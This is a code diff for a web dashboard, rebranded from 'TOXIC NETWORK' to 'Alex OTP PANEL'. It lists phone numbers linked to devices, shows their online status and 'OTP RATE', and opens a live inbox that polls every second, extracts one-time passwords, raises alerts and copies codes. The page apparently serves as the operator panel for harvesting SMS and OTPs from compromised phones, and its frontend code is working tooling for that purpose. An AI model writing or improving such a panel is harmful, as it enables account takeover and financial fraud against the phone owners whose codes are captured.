-.search-box input:focus{border-color:#00ff41;box-shadow:0 0 0 3px rgba(0,255,65,.15)}
-.search-box input::placeholder{color:#4a5270}
-.num-card{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;transition:.15s;min-height:70px;position:relative;overflow:hidden}
-.num-card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:#00ff41;opacity:0;transition:.2s}
-.num-card:hover::before{opacity:1}
-.num-card:hover{border-color:rgba(0,255,65,.3);background:#0f1a14}
-.num-card:active{transform:scale(.99)}
-.num-card.offline::before{background:#ff3860}
-.num-card.offline{opacity:.9}
-.num-icon{width:42px;height:42px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;background:rgba(0,255,65,.1);border:1px solid rgba(0,255,65,.3);color:#00ff41}
-.num-icon.red{background:rgba(255,56,96,.1);border-color:rgba(255,56,96,.3);color:#ff3860}
-.num-icon.gray{background:rgba(122,133,168,.1);border-color:rgba(122,133,168,.3);color:#7a85a8}
+.search-box input{width:100%;padding:14px 16px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;outline:none;color:#1e293b}
+.search-box input:focus{border-color:#8b5cf6}
+.num-card{background:#fff;border-radius:14px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;transition:.15s;box-shadow:0 2px 6px rgba(99,102,241,.05);min-height:70px}
+.num-card:active{transform:scale(.98);background:#fafafa}
+.num-card.offline{opacity:0.85}
+.num-icon{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;background:linear-gradient(135deg,#dcfce7,#bbf7d0)}
+.num-icon.red{background:linear-gradient(135deg,#fee2e2,#fecaca)}
+.num-icon.gray{background:linear-gradient(135deg,#f1f5f9,#e2e8f0)}
 .num-info{flex:1;min-width:0}
-.num-title{font-size:14px;font-weight:700;color:#e0e6ff;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;letter-spacing:.5px;font-family:'Courier New',monospace}
-.num-title.unknown{color:#7a85a8;font-style:italic}
-.num-title .confidence-badge{font-size:9px;background:rgba(0,255,65,.15);color:#00ff41;padding:2px 6px;border-radius:4px;margin-left:6px;font-weight:700;border:1px solid rgba(0,255,65,.3)}
-.num-title .confidence-badge.low{background:rgba(255,215,0,.15);color:#ffd700;border-color:rgba(255,215,0,.3)}
-.num-sub{font-size:10px;color:#7a85a8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap;letter-spacing:.5px;font-family:'Courier New',monospace}
-.num-sub .pill{background:#0a0e1a;border:1px solid #1f2937;padding:2px 7px;border-radius:4px;color:#7a85a8;font-size:9px;font-weight:700}
-.num-sub .pill.otp{background:rgba(168,85,247,.1);color:#a855f7;border-color:rgba(168,85,247,.3)}
-.badge-online{display:flex;align-items:center;gap:5px;font-size:10px;color:#00ff41;font-weight:700;flex-shrink:0;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.badge-online .dot{width:7px;height:7px;border-radius:50%;background:#00ff41;box-shadow:0 0 8px #00ff41;animation:pulse 1.5s infinite}
-.badge-offline{display:flex;align-items:center;gap:5px;font-size:10px;color:#ff3860;font-weight:700;flex-shrink:0;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.badge-offline .dot{width:7px;height:7px;border-radius:50%;background:#ff3860;box-shadow:0 0 8px #ff3860}
-.inbox-header{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:16px;margin-bottom:12px}
+.num-title{font-size:14px;font-weight:700;color:#1e293b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.num-title.unknown{color:#94a3b8;font-style:italic}
+.num-title .confidence-badge{font-size:10px;background:#dcfce7;color:#166534;padding:2px 6px;border-radius:8px;margin-left:4px;font-weight:700}
+.num-title .confidence-badge.low{background:#fef3c7;color:#92400e}
+.num-sub{font-size:11px;color:#94a3b8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap}
+.num-sub .pill{background:#f1f5f9;padding:2px 7px;border-radius:6px;color:#64748b;font-size:10px;font-weight:600}
+.num-sub .pill.otp{background:#ede9fe;color:#7c3aed}
+.badge-online{display:flex;align-items:center;gap:5px;font-size:11px;color:#16a34a;font-weight:600;flex-shrink:0}
+.badge-online .dot{width:8px;height:8px;border-radius:50%;background:#16a34a;box-shadow:0 0 0 3px rgba(22,163,74,.15)}
+.badge-offline{display:flex;align-items:center;gap:5px;font-size:11px;color:#dc2626;font-weight:600;flex-shrink:0}
+.badge-offline .dot{width:8px;height:8px;border-radius:50%;background:#dc2626;box-shadow:0 0 0 3px rgba(220,38,38,.15)}
+.arrow{color:#cbd5e1;font-size:20px}
+.inbox-header{background:#fff;border-radius:14px;padding:16px;margin-bottom:12px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
 .inbox-top{display:flex;align-items:center;gap:10px;margin-bottom:12px}
-.back-btn{background:#0a0e1a;border:1px solid #1f2937;width:42px;height:42px;border-radius:8px;font-size:18px;cursor:pointer;color:#00ff41;font-weight:700;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0;padding:0;transition:.2s}
-.back-btn:hover{background:rgba(0,255,65,.1);border-color:rgba(0,255,65,.4)}
-.inbox-num{font-size:16px;font-weight:900;color:#00ff41;letter-spacing:1px;text-shadow:0 0 10px rgba(0,255,65,.5);font-family:'Courier New',monospace}
-.inbox-num.unknown{color:#7a85a8;font-style:italic;text-shadow:none}
-.inbox-status{display:flex;align-items:center;gap:6px;font-size:10px;color:#00ff41;font-weight:700;margin-top:2px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.inbox-status .dot{width:7px;height:7px;border-radius:50%;background:#00ff41;box-shadow:0 0 8px #00ff41;animation:pulse 1.5s infinite}
-.inbox-status.offline{color:#ff3860}
-.inbox-status.offline .dot{background:#ff3860;box-shadow:0 0 8px #ff3860;animation:none}
-.inbox-meta{font-size:10px;color:#4a5270;display:flex;justify-content:space-between;align-items:center;gap:8px;letter-spacing:1px;font-family:'Courier New',monospace}
-.refresh-icon{cursor:pointer;font-size:20px;color:#00ff41;user-select:none;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
+.back-btn{background:#f1f5f9;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;cursor:pointer;color:#475569;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0;padding:0}
+.back-btn:active{transform:scale(.9)}
+.inbox-num{font-size:16px;font-weight:800;color:#1e293b}
+.inbox-num.unknown{color:#94a3b8;font-style:italic}
+.inbox-status{display:flex;align-items:center;gap:6px;font-size:12px;color:#16a34a;font-weight:600;margin-top:2px}
+.inbox-status .dot{width:8px;height:8px;border-radius:50%;background:#16a34a;box-shadow:0 0 0 4px rgba(22,163,74,.15)}
+.inbox-status.offline{color:#dc2626}
+.inbox-status.offline .dot{background:#dc2626;box-shadow:0 0 0 4px rgba(220,38,38,.15)}
+.inbox-meta{font-size:11px;color:#94a3b8;display:flex;justify-content:space-between;align-items:center;gap:8px}
+.refresh-icon{cursor:pointer;font-size:20px;color:#94a3b8;user-select:none;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
 .refresh-icon:active{transform:scale(.9)}
 .refresh-icon.spinning{animation:spin 1s linear infinite}
-.top-number-badge{background:linear-gradient(135deg,rgba(255,215,0,.1),rgba(255,149,0,.1));border:1px solid rgba(255,215,0,.4);border-radius:10px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:12px;font-weight:700;color:#ffd700;box-shadow:0 0 15px rgba(255,215,0,.15);font-family:'Courier New',monospace}
-.top-number-badge .tn-icon{font-size:22px;flex-shrink:0;filter:drop-shadow(0 0 8px #ffd700)}
+.top-number-badge{background:linear-gradient(135deg,#fef3c7,#fde68a);border:2px solid #fbbf24;border-radius:12px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:#92400e;box-shadow:0 2px 8px rgba(251,191,36,.2)}
+.top-number-badge .tn-icon{font-size:22px;flex-shrink:0}
 .top-number-badge .tn-info{flex:1;min-width:0}
-.top-number-badge .tn-num{font-size:16px;font-weight:900;color:#ffd700;letter-spacing:.5px;word-break:break-all;text-shadow:0 0 8px rgba(255,215,0,.5)}
-.top-number-badge .tn-count{font-size:10px;color:#ffd700;font-weight:600;margin-top:2px;opacity:.8;letter-spacing:1px}
-.top-number-badge .tn-highlight{background:rgba(255,215,0,.2);color:#ffd700;padding:2px 8px;border-radius:4px;font-weight:900;font-size:10px;border:1px solid rgba(255,215,0,.4)}
-.sms-list{background:#111827;border:1px solid #1f2937;border-radius:10px;overflow:hidden}
-.sms-item{padding:16px;border-bottom:1px solid #1f2937;position:relative;transition:.2s}
+.top-number-badge .tn-num{font-size:16px;font-weight:800;color:#78350f;letter-spacing:.5px;word-break:break-all}
+.top-number-badge .tn-count{font-size:11px;color:#92400e;font-weight:600;margin-top:2px;opacity:.8}
+.top-number-badge .tn-highlight{background:#fbbf24;color:#78350f;padding:2px 8px;border-radius:8px;font-weight:800;font-size:11px}
+.sms-list{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(99,102,241,.06)}
+.sms-item{padding:16px;border-bottom:1px solid #f1f5f9;position:relative}
 .sms-item:last-child{border-bottom:none}
-.sms-item.fresh{background:linear-gradient(90deg,rgba(0,255,65,.08),transparent 60%);border-left:3px solid #00ff41}
-.sms-item.otp-item{background:linear-gradient(90deg,rgba(168,85,247,.08),transparent 60%);border-left:3px solid #a855f7}
-.sms-item .msg-type-badge{position:absolute;top:10px;right:10px;font-size:9px;font-weight:900;padding:2px 7px;border-radius:4px;letter-spacing:1px;font-family:'Courier New',monospace}
-.sms-item .msg-type-badge.otp{background:linear-gradient(135deg,#a855f7,#7c3aed);color:#fff;box-shadow:0 0 10px rgba(168,85,247,.4)}
-.sms-item .msg-type-badge.number{background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a;box-shadow:0 0 10px rgba(0,255,65,.4)}
+.sms-item.fresh{background:linear-gradient(90deg,#f0fdf4,#fff 60%);border-left:4px solid #16a34a}
+.sms-item.otp-item{background:linear-gradient(90deg,#faf5ff,#fff 60%);border-left:4px solid #a855f7}
+.sms-item .msg-type-badge{position:absolute;top:10px;right:10px;font-size:9px;font-weight:800;padding:2px 6px;border-radius:6px;letter-spacing:.5px}
+.sms-item .msg-type-badge.otp{background:#a855f7;color:#fff}
+.sms-item .msg-type-badge.number{background:#16a34a;color:#fff}
 .sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;flex-wrap:wrap}
-.sender{font-size:11px;font-weight:900;color:#ff3860;letter-spacing:.5px;display:flex;align-items:center;flex-wrap:wrap;font-family:'Courier New',monospace;text-transform:uppercase}
-.new-badge{background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;font-size:9px;font-weight:900;padding:2px 7px;border-radius:4px;margin-left:6px;letter-spacing:1px;animation:pulse 1s infinite;box-shadow:0 0 10px rgba(255,56,96,.5)}
-.sms-time{font-size:10px;color:#4a5270;font-weight:600;white-space:nowrap;letter-spacing:.5px;font-family:'Courier New',monospace}
-.sms-time.fresh{color:#00ff41;font-weight:900}
-.time-ago{font-size:9px;color:#4a5270;font-weight:600;margin-top:2px;text-align:right;letter-spacing:.5px;font-family:'Courier New',monospace}
-.time-ago.fresh{color:#00ff41}
-.sms-body{font-size:13px;color:#c5d0e6;line-height:1.6;word-break:break-word;white-space:pre-wrap;font-family:'Courier New',monospace}
-.sms-body .phone-highlight{background:rgba(255,215,0,.15);color:#ffd700;padding:1px 5px;border-radius:3px;font-weight:700;border:1px solid rgba(255,215,0,.3)}
-.otp-highlight{background:linear-gradient(135deg,rgba(0,255,65,.2),rgba(0,229,255,.2));color:#00ff41;padding:2px 6px;border-radius:4px;font-weight:900;border:1px solid rgba(0,255,65,.4);text-shadow:0 0 8px rgba(0,255,65,.5)}
-.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a;border:none;border-radius:6px;font-weight:900;font-size:11px;cursor:pointer;letter-spacing:1px;min-height:40px;text-transform:uppercase;font-family:'Courier New',monospace;transition:.2s}
-.otp-copy-btn:hover{box-shadow:0 0 20px rgba(0,255,65,.5)}
+.sender{font-size:12px;font-weight:800;color:#ef4444;letter-spacing:.3px;display:flex;align-items:center;flex-wrap:wrap}
+.new-badge{background:linear-gradient(135deg,#dc2626,#ef4444);color:#fff;font-size:9px;font-weight:800;padding:2px 6px;border-radius:10px;margin-left:6px;letter-spacing:.5px;animation:pulseBadge 1s infinite}
+@keyframes pulseBadge{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.1);opacity:.8}}
+.sms-time{font-size:11px;color:#94a3b8;font-weight:500;white-space:nowrap}
+.sms-time.fresh{color:#16a34a;font-weight:700}
+.time-ago{font-size:10px;color:#94a3b8;font-weight:600;margin-top:2px;text-align:right}
+.time-ago.fresh{color:#16a34a}
+.sms-body{font-size:14px;color:#334155;line-height:1.55;word-break:break-word;white-space:pre-wrap}
+.sms-body .phone-highlight{background:#fef3c7;color:#92400e;padding:1px 5px;border-radius:4px;font-weight:700;border:1px dashed #fbbf24}
+.otp-highlight{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;padding:2px 6px;border-radius:5px;font-weight:700;border:1px dashed #86efac}
+.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;border-radius:20px;font-weight:700;font-size:12px;cursor:pointer;letter-spacing:.5px;min-height:40px}
 .otp-copy-btn:active{transform:scale(.96)}
-.empty{text-align:center;padding:50px 20px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:10px;letter-spacing:1px;font-family:'Courier New',monospace}
-.loading-text{text-align:center;padding:20px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:8px;margin-bottom:14px;letter-spacing:1px;font-family:'Courier New',monospace}
-.spinner{display:inline-block;width:14px;height:14px;border:2px solid #1f2937;border-top-color:#00ff41;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
-.progress-bar{width:100%;height:4px;background:#1f2937;border-radius:2px;overflow:hidden;margin-top:10px}
-.progress-fill{height:100%;background:linear-gradient(90deg,#00ff41,#00e5ff);border-radius:2px;transition:width .3s;box-shadow:0 0 10px rgba(0,255,65,.5)}
-.live-badge{display:inline-flex;align-items:center;gap:4px;background:rgba(0,255,65,.15);color:#00ff41;font-size:9px;font-weight:700;padding:3px 8px;border-radius:4px;margin-left:6px;letter-spacing:1px;border:1px solid rgba(0,255,65,.3);font-family:'Courier New',monospace}
-.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#00ff41;animation:pulse 1.2s infinite;box-shadow:0 0 8px #00ff41}
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#00ff41;color:#0a0e1a;padding:14px 24px;border-radius:8px;font-weight:900;font-size:13px;box-shadow:0 0 30px rgba(0,255,65,.5);z-index:9999;transition:transform .3s;pointer-events:none;max-width:90vw;text-align:center;letter-spacing:1px;font-family:'Courier New',monospace}
+.empty{text-align:center;padding:50px 20px;color:#94a3b8;font-size:14px;background:#fff;border-radius:14px}
+.loading-text{text-align:center;padding:20px;color:#94a3b8;font-size:13px;background:#fff;border-radius:12px;margin-bottom:14px}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid #e2e8f0;border-top-color:#8b5cf6;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
+.progress-bar{width:100%;height:6px;background:#e2e8f0;border-radius:3px;overflow:hidden;margin-top:10px}
+.progress-fill{height:100%;background:linear-gradient(90deg,#7c3aed,#ec4899);border-radius:3px;transition:width .3s}
+.live-badge{display:inline-flex;align-items:center;gap:4px;background:#dcfce7;color:#166534;font-size:10px;font-weight:700;padding:3px 8px;border-radius:20px;margin-left:6px}
+.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#16a34a;animation:pulse 1.2s infinite}
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;box-shadow:0 10px 30px rgba(0,0,0,.2);z-index:9999;transition:transform .3s;pointer-events:none;max-width:90vw;text-align:center}
 .toast.show{transform:translateX(-50%) translateY(0)}
 .hidden{display:none !important}
 @media(min-width:600px){.stats{grid-template-columns:repeat(4,1fr)}}</style></head><body>
 
 <div class="topbar">
-<div class="brand"><span class="toxic">☣ TOXIC</span> <span class="net">NETWORK</span></div>
+<div class="brand"><span class="alex">Alex</span> <span class="panel">OTP PANEL</span></div>
 <div class="top-actions">
-<button class="refresh-btn" id="refresh-btn" onclick="manualRefresh()" title="Refresh">⟳</button>
+<button class="refresh-btn" id="refresh-btn" onclick="manualRefresh()" title="Refresh">🔄</button>
 <div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
-<a href="/logout" class="logout-btn">⏻ EXIT</a>
+<a href="/logout" class="logout-btn">Logout</a>
 </div>
-<div class="nav"><a href="/" class="nav-link active">◉ NUMBERS</a><a href="/otp" class="nav-link otp">◈ PERSONAL OTP</a></div>
+<div class="nav"><a href="/" class="nav-link active">📱 Numbers</a><a href="/otp" class="nav-link otp">🔐 Personal OTP</a></div>
 </div>
 
 <div class="container">
-<div id="session-banner-wrap"></div>
 <div id="list-view">
 <div class="stats">
 <div class="stat total" id="stat-total"><div class="label">TOTAL</div><div class="value" id="s-total">0</div></div>
@@ -1027,25 +882,25 @@ body{background:#0a0e1a;color:#e0e6ff;padding:0 0 40px;background-image:radial-g
 <div class="stat offline" id="stat-offline"><div class="label">OFFLINE</div><div class="value" id="s-offline">0</div></div>
 <div class="stat otp" id="stat-otp"><div class="label">OTP RATE</div><div class="value" id="s-otp">0%</div></div>
 </div>
-<div class="quick"><div class="info">▸ ACTIVE NUMBERS : <b id="q-dev">0</b></div></div>
+<div class="quick"><div class="info">📱 Numbers : <b id="q-dev">0</b></div></div>
 <div class="filter-live">
-<button class="filter-live-btn online" id="btn-online" onclick="setLocalFilter('online')">● ONLINE <span class="count-badge" id="badge-online">0</span></button>
-<button class="filter-live-btn offline" id="btn-offline" onclick="setLocalFilter('offline')">● OFFLINE <span class="count-badge" id="badge-offline">0</span></button>
+<button class="filter-live-btn online" id="btn-online" onclick="setLocalFilter('online')">🟢 Online <span class="count-badge" id="badge-online">0</span></button>
+<button class="filter-live-btn offline" id="btn-offline" onclick="setLocalFilter('offline')">🔴 Offline <span class="count-badge" id="badge-offline">0</span></button>
 </div>
-<div id="loading-text" class="loading-text"><span class="spinner"></span><span id="loading-msg">INITIALIZING...</span><div class="progress-bar"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div></div>
-<div id="list-content" class="hidden"><div class="search-box"><input id="search-num" placeholder="▸ SEARCH NUMBER / DEVICE" oninput="renderNumbers()"></div><div class="list-header"><h2 id="list-title">◉ ALL NUMBERS <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2><span class="count" id="num-count">0</span></div><div id="num-list"></div></div>
+<div id="loading-text" class="loading-text"><span class="spinner"></span><span id="loading-msg">Loading data...</span><div class="progress-bar"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div></div>
+<div id="list-content" class="hidden"><div class="search-box"><input id="search-num" placeholder="🔎 Search number / device" oninput="renderNumbers()"></div><div class="list-header"><h2 id="list-title">📱 All Numbers <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2><span class="count" id="num-count">0</span></div><div id="num-list"></div></div>
 </div>
 
 <div id="inbox-view" class="hidden">
 <div class="inbox-header">
 <div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div></div></div>
-<div class="inbox-meta"><span id="inbox-meta">⚡ LIVE · AUTO 1S · LATEST 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">⟳</span></div>
+<div class="inbox-meta"><span id="inbox-meta">⚡ LIVE · auto 1s · Latest 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">🔄</span></div>
 </div>
 <div id="top-number-badge" class="top-number-badge hidden">
 <div class="tn-icon">🏆</div>
 <div class="tn-info">
 <div class="tn-num" id="tn-num">-</div>
-<div class="tn-count">MOST FREQUENT SMS NUMBER <span class="tn-highlight" id="tn-count-badge">0x</span></div>
+<div class="tn-count">Sabse zyada baar aaya SMS me <span class="tn-highlight" id="tn-count-badge">0 bar</span></div>
 </div>
 </div>
 <div id="sms-container"></div>
@@ -1065,7 +920,679 @@ let allInboxMsgs = [];
 let localFilter = 'all';
 let lastOtpSeen = '';
 let notifPermissionAsked = false;
-let panelState = {active:true, expires_at:0, passwordless:false};
+
+function toast(text){
+  const t = document.getElementById('toast');
+  t.textContent = text;
+  t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'), 2500);
+}
+
+function playOtpSound(){
+  try{
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    [880, 1100, 880].forEach((freq, i) => {
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.connect(gain); gain.connect(ctx.destination);
+      osc.frequency.value = freq;
+      const t = ctx.currentTime + i * 0.2;
+      gain.gain.setValueAtTime(0.2, t);
+      gain.gain.exponentialRampToValueAtTime(0.001, t + 0.18);
+      osc.start(t); osc.stop(t + 0.18);
+    });
+  }catch(e){}
+}
+
+function askNotificationPermission(){
+  if(notifPermissionAsked) return;
+  notifPermissionAsked = true;
+  if('Notification' in window && Notification.permission === 'default'){
+    Notification.requestPermission();
+  }
+}
+
+function showOtpNotification(otp, from, message){
+  toast('🔔 OTP: ' + otp + ' — ' + from);
+  playOtpSound();
+  if('Notification' in window && Notification.permission === 'granted'){
+    try{
+      const n = new Notification('🔔 OTP: ' + otp, {
+        body: from + '\n' + message.slice(0, 100),
+        tag: 'otp-' + otp,
+      });
+      setTimeout(()=>n.close(), 10000);
+    }catch(e){}
+  }
+  if(navigator.vibrate){
+    try{ navigator.vibrate([200, 100, 200, 100, 200]); }catch(e){}
+  }
+}
+
+async function manualRefresh(){
+  const btn = document.getElementById('refresh-btn');
+  btn.classList.add('spinning');
+  toast('🔄 Refreshing...');
+  try{
+    const r = await fetch('/api/refresh', {method: 'POST'});
+    const d = await r.json();
+    if(d.success){
+      setTimeout(()=>loadNumbers(), 800);
+      toast('✅ Refresh triggered');
+    } else {
+      toast('❌ ' + (d.error || 'Refresh failed'));
+    }
+  }catch(e){
+    toast('❌ Network error');
+  }
+  setTimeout(()=>btn.classList.remove('spinning'), 1500);
+}
+
+function setLocalFilter(f){
+  if(localFilter === f){ localFilter = 'all'; }
+  else { localFilter = f; }
+  updateFilterButtons();
+  applyLocalFilter();
+  renderNumbers();
+}
+
+function updateFilterButtons(){
+  document.getElementById('btn-online').classList.toggle('active-filter', localFilter === 'online');
+  document.getElementById('btn-offline').classList.toggle('active-filter', localFilter === 'offline');
+  let titleText = '📱 All Numbers';
+  if(localFilter === 'online') titleText = '🟢 Online Numbers';
+  else if(localFilter === 'offline') titleText = '🔴 Offline Numbers';
+  document.getElementById('list-title').innerHTML = titleText + ' <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span>';
+}
+
+function applyLocalFilter(){
+  if(localFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
+  else if(localFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
+  else numbers = allNumbers.slice();
+  document.getElementById('num-count').textContent = numbers.length;
+}
+
+async function checkConn(){
+  try{
+    const r = await fetch('/api/conn');
+    const d = await r.json();
+    const badge = document.getElementById('conn-badge');
+    const txt = document.getElementById('conn-text');
+    if(d.mongo_connected){
+      badge.className = 'conn online';
+      txt.textContent = 'Live';
+    } else {
+      badge.className = 'conn offline';
+      txt.textContent = 'Off';
+    }
+  }catch(e){}
+}
+
+function flash(id){
+  const el = document.getElementById(id);
+  if(!el) return;
+  el.classList.add('flash');
+  setTimeout(()=>el.classList.remove('flash'), 400);
+}
+
+async function loadNumbers(){
+  try{
+    const r = await fetch('/api/numbers');
+    const d = await r.json();
+    if(!d.success){
+      document.getElementById('loading-msg').textContent = '❌ '+(d.error||'Error');
+      return;
+    }
+    allNumbers = d.numbers || [];
+    if(parseInt(document.getElementById('s-total').textContent) !== d.total) flash('stat-total');
+    if(parseInt(document.getElementById('s-online').textContent) !== d.online) flash('stat-online');
+    if(parseInt(document.getElementById('s-offline').textContent) !== d.offline) flash('stat-offline');
+    document.getElementById('s-total').textContent = d.total;
+    document.getElementById('s-online').textContent = d.online;
+    document.getElementById('s-offline').textContent = d.offline;
+    document.getElementById('s-otp').textContent = d.otp_rate + '%';
+    document.getElementById('q-dev').textContent = allNumbers.length;
+    document.getElementById('badge-online').textContent = d.online;
+    document.getElementById('badge-offline').textContent = d.offline;
+    if(d.progress){
+      const pct = d.progress.total > 0 ? Math.floor(d.progress.done / d.progress.total * 100) : 0;
+      document.getElementById('prog-fill').style.width = pct + '%';
+      document.getElementById('loading-msg').textContent = `Fetching ${d.progress.done}/${d.progress.total} (${pct}%)...`;
+    }
+    applyLocalFilter();
+    const badge = document.getElementById('live-badge');
+    if(d.loading && allNumbers.length > 0 && badge) badge.style.display = 'inline-flex';
+    else if(badge) badge.style.display = 'none';
+    if(allNumbers.length > 0){
+      document.getElementById('loading-text').classList.add('hidden');
+      document.getElementById('list-content').classList.remove('hidden');
+      const sig = allNumbers.length + '|' + d.online + '|' + d.otp_rate + '|' + localFilter;
+      if(sig !== lastSig){ lastSig = sig; renderNumbers(); }
+    } else if(d.loading){
+      document.getElementById('loading-text').classList.remove('hidden');
+      document.getElementById('list-content').classList.add('hidden');
+    } else {
+      document.getElementById('loading-text').classList.remove('hidden');
+      document.getElementById('loading-msg').textContent = '📭 No numbers found';
+      document.getElementById('list-content').classList.add('hidden');
+    }
+  }catch(e){
+    document.getElementById('loading-msg').textContent = '❌ Network error';
+  }
+}
+
+// ✅ USER: Raw Data button NAHI
+function renderNumbers(){
+  const q = (document.getElementById('search-num').value || '').toLowerCase();
+  const box = document.getElementById('num-list');
+  const filtered = numbers.filter(n => !q ||
+    (n.number||'').toLowerCase().includes(q) ||
+    (n.device_name||'').toLowerCase().includes(q));
+  if(filtered.length === 0){
+    box.innerHTML = '<div class="empty">📭 No numbers found</div>';
+    return;
+  }
+  box.innerHTML = filtered.map(n => {
+    const isOnline = n.online === true;
+    const isUnknown = (n.number || '').startsWith('UNKNOWN-');
+    const iconCls = isUnknown ? 'gray' : (isOnline ? '' : 'red');
+    const badgeCls = isOnline ? 'badge-online' : 'badge-offline';
+    const badgeTxt = isOnline ? 'Online' : 'Offline';
+    const cardCls = isOnline ? '' : 'offline';
+    const titleCls = isUnknown ? 'unknown' : '';
+    const confidence = n.confidence || 0;
+    let confBadge = '';
+    if(!isUnknown && confidence > 0){
+      confBadge = `<span class="confidence-badge">✓ ${confidence}x</span>`;
+    } else if(!isUnknown){
+      confBadge = `<span class="confidence-badge low">⚠️ 1x</span>`;
+    }
+    return `
+      <div class="num-card ${cardCls}">
+        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '❓' : '📶'}</div>
+        <div class="num-info" onclick="openInboxGlobal(${numbers.indexOf(n)})">
+          <div class="num-title ${titleCls}">${escapeHtml(n.number)} ${confBadge}</div>
+          <div class="num-sub">
+            <span class="pill">📨 ${n.msg_count} SMS</span>
+            ${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}
+          </div>
+        </div>
+        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
+      </div>
+    `;
+  }).join('');
+}
+
+function openInboxGlobal(idx){
+  if(idx < 0 || idx >= numbers.length) return;
+  openInbox(numbers[idx]);
+}
+
+async function openInbox(n){
+  currentNum = n;
+  lastInboxSig = '';
+  allInboxMsgs = [];
+  lastOtpSeen = '';
+  askNotificationPermission();
+  document.getElementById('list-view').classList.add('hidden');
+  document.getElementById('inbox-view').classList.remove('hidden');
+  const inboxNumEl = document.getElementById('inbox-num');
+  inboxNumEl.textContent = n.number;
+  if((n.number || '').startsWith('UNKNOWN-')){
+    inboxNumEl.className = 'inbox-num unknown';
+  } else {
+    inboxNumEl.className = 'inbox-num';
+  }
+  const statusEl = document.getElementById('inbox-status');
+  const statusTxt = document.getElementById('inbox-status-text');
+  if(n.online === true){
+    statusEl.className = 'inbox-status';
+    statusTxt.textContent = 'Online';
+  } else {
+    statusEl.className = 'inbox-status offline';
+    statusTxt.textContent = 'Offline';
+  }
+  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading messages...</div>';
+  await loadInbox(false);
+  if(refreshTimer) clearInterval(refreshTimer);
+  refreshTimer = setInterval(()=>loadInbox(false), 1000);
+}
+
+function findTopNumber(msgs){
+  const counter = {};
+  const senderNums = new Set();
+  msgs.forEach(m => {
+    const from = m.from || '';
+    const found = from.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
+    found.forEach(n => senderNums.add(n));
+  });
+  msgs.forEach(m => {
+    const text = m.message || '';
+    const found = text.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
